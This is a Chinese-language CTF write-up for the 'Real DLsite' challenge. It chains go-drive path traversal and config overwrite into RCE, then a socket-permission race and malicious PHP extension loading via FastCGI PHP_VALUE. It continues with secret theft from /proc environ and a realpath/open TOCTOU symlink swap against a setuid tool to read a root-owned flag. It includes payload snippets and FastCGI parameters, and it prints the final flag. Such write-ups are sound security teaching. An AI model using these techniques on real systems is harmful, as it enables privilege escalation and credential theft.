# Real DLsite

## 题目简述

题目由 StorageBox、go-drive 和 PHP 三层组成。go-drive 以 `app` 身份运行，PHP/FPM 与 fcgiwrap 以 `www-data` 身份运行，StorageBox 是 setuid root 工具，flag 被存入 root 的 StorageBox 区域。解法需要先拿到 go-drive RCE，再跨到 `www-data`，最后利用 StorageBox 的 TOCTOU 把 root flag 搬到可读 box。

## 解题过程

附件中的服务结构可以整理为：

```text
Apache
  -> /new 代理到 go-drive v0.12.0，用户 app
  -> dlsite PHP 站点，用户 www-data，PHP 受 open_basedir/disable_functions 限制

fcgiwrap
  -> 用户 www-data，可运行 CGI 程序

StorageBox
  -> setuid root，自定义安全存储工具
  -> 按 uid-gid 把文件放在 /root/<uid>-<gid>/

cron
  -> 每 5 分钟以 root 身份执行：
     APP_SECRET="$(cat /run/secrets/www)" \
       su -s /bin/bash -p www-data -c 'StorageBox put /var/www/html/db.sqlite'
```

go-drive 后台使用默认凭据 `admin:123456`。后台新增 drive 的代码前面做了 `CleanPath()`，但后面 `Join()` 使用的不是 clean 后的路径，导致 `free-fs: false` 仍可被路径遍历绕过。新增 drive 时把 root 指到 `/app`：

```json
{"path":"../../../app"}
```

即可覆盖 `/app/config.yml`。把 thumbnail handler 改成 shell 类型：

```yaml
thumbnail:
  handlers:
    - type: shell
      file-types: pwn
      config:
        shell: /lib64/ld-linux-x86-64.so.2 /tmp/your_prog
        mime-type: text/plain
        write-content: false
        max-size: -1
        timeout: 20s
```

go-drive 只在启动时读取配置。后台的 script 功能可以执行 JavaScript，构造递归或大量字符串拼接触发 panic/OOM，supervisor 自动重启后就会加载新的 thumbnail handler：

```javascript
function f(){return f()+1;} f();
```

随后上传匹配后缀的文件并请求 thumbnail，即可获得 `app` 身份 RCE。

下一步需要跨到 `www-data`。PHP 站点也有默认后台，可以执行 SQLite 语句，`VACUUM INTO` 能写 webshell，但 `disable_functions`、`disable_classes` 和 open_basedir 会挡住直接 RCE。这里利用 PHP 文件操作的 check/use 路径解析不一致：

```text
check: filename -> realpath 当前路径 -> open_basedir 判断
use:   filename -> 再次解析路径 -> chmod(2)
```

构造目录：

```text
/var/www/html/assets/a/b/c/d/e/r.php
```

`r.php` 循环执行：

```php
<?php
while (true) {
    @chmod("../../../../../run/php/php-fpm.sock", 0666);
}
```

同时用 go-drive 的 `app` shell 反复 rename：

```text
/var/www/html/assets/a/b/c/d/e  <=>  /var/www/html/assets/a/e
```

当 `php-fpm.sock` 被 chmod 成功后，`app` 就能连接 FPM socket。通过 FastCGI 参数设置：

```text
PHP_VALUE=extension=/tmp/yours.so
```

即可让 PHP-FPM 加载恶意扩展，获得 `www-data` 身份 RCE。

实际触发时可以把 go-drive 的 thumbnail shell 目标写成 `/lib64/ld-linux-x86-64.so.2 /tmp/gdexec`。`gdexec` 一边在 20 秒窗口内反复交换深浅目录：

```text
/var/www/html/assets/a/b/c/d/e  <=>  /var/www/html/assets/a/e
```

一边尝试连接 `/run/php/php-fpm.sock`。连接成功后手工发送 FastCGI 记录，参数至少需要包含：

```text
SCRIPT_FILENAME=/var/www/html/assets/actf_eval.php
SCRIPT_NAME=/assets/actf_eval.php
DOCUMENT_ROOT=/var/www/html
PHP_VALUE=extension=/tmp/launch_ctor.so
```

这样 PHP-FPM 会在处理请求时加载 `/tmp/launch_ctor.so`。

由于 PHP 是通过 no_priv 启动的，`PR_SET_NO_NEW_PRIVS` 会阻止它直接运行 setuid 的 StorageBox。继续对 fcgiwrap socket 重复同样的 chmod/rename race；fcgiwrap 以 `www-data` 运行但不受同样的 no_new_privs 限制，发送：

```text
SCRIPT_FILENAME=/tmp/your_prog
```

即可得到能调用 StorageBox 的 `www-data` 执行能力。

恶意扩展中可以用 `__attribute__((constructor))` 放启动逻辑。构造函数 fork 子进程后连接 fcgiwrap 的 `/run/apache2/ancient.sock`，再发一组 FastCGI 参数：

```text
SCRIPT_FILENAME=/tmp/pwn_helper
SCRIPT_NAME=/pwn_helper
DOCUMENT_ROOT=/tmp
```

`/tmp/pwn_helper` 需要提前通过 PHP 写入并 `chmod 0755`。这一步的作用不是再拿一个交互 shell，而是把后续读取 `APP_SECRET` 和 race StorageBox 的逻辑放到不受 no_new_privs 限制的 `www-data` CGI 进程里执行。

StorageBox 需要对应用户的 `APP_SECRET`。cron 每 5 分钟执行备份时，`www-data` 进程的 environ 中会带着：

```text
APP_SECRET=<从 /run/secrets/www 读取的值>
```

已经有 `www-data` shell 后，可以在 cron 窗口内扫 `/proc/<pid>/environ` 提取 secret。

稳定做法是在 helper 中启动多个 worker 轮询 `/proc`。先筛选 `cmdline` 里包含：

```text
StorageBox put /var/www/html/db.sqlite
```

的进程，再读取对应的 `environ`，从以 `APP_SECRET=` 开头的环境变量里取出 StorageBox secret。cron 是 5 分钟一次，因此扫描窗口需要覆盖一个完整周期；拿到 secret 后把它暂存到 `www-data` 可读写目录，后续每次调用 StorageBox 前都设置同名环境变量。

flag 被 root 放在：

```text
/root/0-0/flag
```

而 `www-data` 的 StorageBox 区域不同。StorageBox 的 `put` 存在典型 TOCTOU：

```c
realpath(src, resolved);   // check
open(src, O_RDONLY);       // use
```

检查和打开没有绑定同一个 inode。用 `www-data` 不断对普通文件和指向 `/root/0-0/flag` 的 symlink 做 swap，同时执行 `StorageBox put`。一旦 race 命中，check 阶段看到普通文件，use 阶段打开 symlink 指向的 root flag，root flag 就会被写入 `www-data` 的 box。再执行 `StorageBox get` 读回即可。

race 阶段可以准备两个路径：

```text
/var/www/html/assets/pwnbox/safe      -> 普通文件
/var/www/html/assets/pwnbox/safe.alt  -> symlink(/root/0-0/flag)
```

子进程循环执行：

```c
syscall(SYS_renameat2, AT_FDCWD, SAFE, AT_FDCWD, ALT, RENAME_EXCHANGE);
```

主进程批量运行 `StorageBox put SAFE`，每轮结束后再 `StorageBox get SAFE` 检查普通文件位置是否已经变成 flag 内容。命中后把结果写到 `/var/www/html/assets/flag.txt`，外部轮询该路径即可收取 flag。

最终得到：

```text
ACTF{d0_an_Upgra3e_1n_s0m3_cases_tDUgp8JNKA}
```

最终脚本完成目标站点注册、登录、补丁与 cron 触发流程，并打印出 flag，说明利用链可稳定复现。

## 方法总结

- 核心技巧：按身份边界逐层扩展能力，从 go-drive 的 app RCE 到 PHP/FPM，再到 fcgiwrap，最终用 StorageBox `realpath/open` TOCTOU 读取 root 区域文件。
- 识别信号：同一题里出现 app、www-data、setuid root 工具、cron secret 和 socket 权限时，应先画出每个身份能读写/执行什么。
- 复用要点：open_basedir 绕过和 StorageBox race 都是 check/use 不一致，但对象不同；前者 race socket 权限，后者 race 文件 inode。
